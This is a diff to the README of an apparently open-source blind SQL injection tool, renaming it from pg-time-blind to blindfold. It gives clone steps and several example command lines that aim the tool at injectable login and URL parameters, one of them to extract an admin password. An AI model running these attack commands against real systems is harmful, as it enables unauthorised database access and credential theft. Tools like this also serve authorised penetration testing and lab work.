@@ -1,4 +1,4 @@
-# pg-time-blind
+# blindfold
 
 A small, dependency-light **blind SQL injection extractor** with **automatic DBMS
 detection** and **three techniques**, chosen for you.
@@ -7,8 +7,8 @@ Point it at any injectable parameter and it works out *where* the injection brea
 out, *which database* is behind it, and the *fastest way* to pull data — then dumps
 the value. No sqlmap; only `requests`.
 
-> The name is historical (it began life as a PostgreSQL time-based tool). It now
-> supports PostgreSQL, MySQL, MSSQL and Oracle, and error/boolean/time techniques.
+> **blindfold** auto-detects the DBMS (PostgreSQL, MySQL, MSSQL, Oracle) and the best
+> blind technique (error / boolean / time), then extracts. Formerly `pg-time-blind`.
 
 ---
 
@@ -69,10 +69,10 @@ pip install -r requirements.txt
 ## Quick start
 
 ```bash
-git clone https://github.com/SirReddington/pg-time-blind.git
-cd pg-time-blind
+git clone https://github.com/SirReddington/blindfold.git
+cd blindfold
 pip install -r requirements.txt
-python3 pg_time_blind.py --help
+python3 blindfold.py --help
 ```
 
 ---
@@ -80,7 +80,7 @@ python3 pg_time_blind.py --help
 ## Usage
 
 ```
-python3 pg_time_blind.py --query "<SQL scalar>" [target] [detection] [tuning]
+python3 blindfold.py --query "<SQL scalar>" [target] [detection] [tuning]
 ```
 
 ### Target (choose one style)
@@ -156,7 +156,7 @@ out for reliability). Pin any backend with `--dbms` to skip fingerprinting.
 **1. Fully automatic — detect context, DBMS and technique, then extract**
 
 ```bash
-python3 pg_time_blind.py \
+python3 blindfold.py \
   -u http://10.10.10.10:3000/login \
   -d "username=INJECT&password=test" \
   --query "SELECT password FROM users WHERE username='admin'"
@@ -165,27 +165,27 @@ python3 pg_time_blind.py \
 **2. Reuse a saved Burp request** (put `INJECT` where the payload goes)
 
 ```bash
-python3 pg_time_blind.py --request req.txt --query "SELECT current_user"
+python3 blindfold.py --request req.txt --query "SELECT current_user"
 ```
 
 **3. Pin MySQL, allow risky OR contexts**
 
 ```bash
-python3 pg_time_blind.py --request req.txt --dbms mysql --allow-or \
+python3 blindfold.py --request req.txt --dbms mysql --allow-or \
   --query "SELECT current_user()"
 ```
 
 **4. Speed up boolean extraction with 8 workers**
 
 ```bash
-python3 pg_time_blind.py -u "http://target/item?id=INJECT" --threads 8 \
+python3 blindfold.py -u "http://target/item?id=INJECT" --threads 8 \
   --query "SELECT version()"
 ```
 
 **5. Force time-based and help the calibrator on a noisy page**
 
 ```bash
-python3 pg_time_blind.py -u http://t/login -d "username=INJECT&password=x" \
+python3 blindfold.py -u http://t/login -d "username=INJECT&password=x" \
   --force-time --true-match "Dashboard" \
   --query "SELECT current_user"
 ```
